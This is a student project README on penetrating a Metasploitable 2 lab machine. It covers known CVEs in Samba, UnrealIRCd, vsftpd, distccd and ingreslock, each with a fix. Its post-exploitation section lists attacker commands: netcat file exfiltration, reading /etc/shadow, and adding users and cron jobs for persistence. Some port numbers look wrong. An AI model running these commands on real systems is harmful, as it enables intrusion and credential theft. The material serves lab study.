# 4240project

## Description:
This project will show a few examples of system penetration. I will be using two virtual machines (both running Ubuntu linux version 22.04) with one running the Metasploitable 2 test environment (https://sourceforge.net/projects/metasploitable/).

When presenting these examples I will be going through these steps
- network scanning 
- vulnerbility assessment
- exploitation
- post-exploitation

## Purpose:
- The purpose of this project is to provide a deeper understanding of system vulnerabilities and the exploitation techiniques used to exploit them. Instead of using the metasploit software to exploit the system vulnerabilites of metasploitable 2, I will be using different python3 functions. This allows the users to be able to view well documented code in an easy to read format. 

## System Requirements:
- Metasploitable 2
- Virtualbox

## Exploits/Vulnerabilities:

### SAMBA CVE-2007-2447 
- Version: 3.0.20 < 3.0.25rc3
- Desc: Samba is a software that is a re-implmentation of the SMB networking protocol. This software provides file and print services for all clients as long as they are using the SMB protocol.
- Exploit: If Samba is configured to use the username map script and it is improperly configured, anyone can send arbitrary commands in disguise as a username to the server. The data sent to the targeted machine is not sanitized. The command will then be run without needing authorization.
- Fix: To fix this, the user can update to a new version. If they are still on the older version, the user can navigate to /etc/samba/smb.conf on the vulnerable machine. The user can then either comment out or remove the line "username map script = /etc/samba/scripts/mapusers.sh". 

### UnrealIRCd CVE-2010-2075
- Version: 3.2.8.1
- Port: 6667
- Desc: UnrealIRCD is a daemon for Internet Realy Chat usage in order to provide chat services.
- Exploit: UnrealIRCD contains an exploit where it will execute any command with the priviledges of the user that is running the service if it begins with the string 'AB'. Ex: AB; [command to run].
- Exploit Cont: This exploit was introduced because someone had replaced all UnrealIRCD file download options on their mirror sites with a version that had a trojan in it.
- Fix: The only way to fix this exploit is to redownload a legitamate version of Unreal. This is because the backdoor is located in the "core" of the service (according to the developers).

### VSFTP CVE-2011-2523
- Version: 2.3.4
- Port: 2121
- Desc: VSFTP is an FTP server for linux. 
- Exploit: There was a backdoor built into the VSFTP service that allows someone to gain root access to a targeted machine if they login with a username that has ':)'. This opens a shell on port 6200, allowing the attacker unauthenticated access.
- Fix: The individual could update the the service or if they are still running on the version with the backdoor, they could set up an iptable to drop unused ports. (Which should be done anyways). Ex: iptables -A INPUT -p tcp --dport 6200 -j DROP and iptables -A INPUT -p udp --dport 6200 -j DROP

### SSH (BRUTE FORCE EXAMPLE)
- Version: Any. Unleass the version is using ssh key pairs.
- Port: 25
- Desc: The SSH service allows for communication between a computer network. 
- Exploit: This is less of an exploit and more of poor system security and poor cyber security practices.
- Fix: Use strong passwords that can not be easily guessed. A more secure option would be to set up ssh key pairs.

### DistCC CVE-2004-2687
- Version: 2.x
- Port: 36255
- Desc: Distccd is a service that allows for a faster compilation time of C programs by distributing the compilation tasks across multiple different machines where it is able to find resources to do so.
- Exploit: DistCCD has a vulnerability that allows an attacker to execute arbitray commands on the targeted system. This is because the distccd daemon improperly handles commands send to it as a compilation request.
- Fix: Other than updating distccd to a version where the exploit has been patched, the user can configure distccd to only accept connection from trusted hosts through the use of a custom firewall configuration.

### Ingreslock 
- Version: ""
- Port: 1524 
- Desc: Ingreslock 
- Exploit: There was a backdoor implemented into Ingreslock on Metasploitable 2. Ingreslock was a popular target for users to add a backdoor on in the past. Often times, machines would be compromised by malicoius code (from software etc...) and it would implement the backdoor on the machine.
- Fix: Navigate to the /etc/inetd.conf file and remove the line "ingreslock stream tcp nowait root /bin/bash bash -i"


## Post-Exploitation Examples:
- Example of an attacker retrieving files from the remote machine
  - Open a terminal on the local host and run "nc -lnvp [portnum] > [file for info to be stored]"
  - On the remote machine (the breached machine) run the command " [IP of local machine] [portnum] < [file path to be retrieved]
- Example of an attacker doing further recon on the system (can help them discover more vulnerabilities by knowing the system specs)
  - uname -a
  - lsb_release
- Example of how an attacker can easily obtain passwords etc
  - cat /etc/shadow (or by directly downloading the file to their local machine)
- Example of an attacker maintaining access (create multiple accounts to blend in)
  - "sudo useradd -m -s /bin/bash newuser" and also "sudo passwd newuser"
  - Creating a cron job to allow access back to the machine during certain times to avoid being detected
  - 
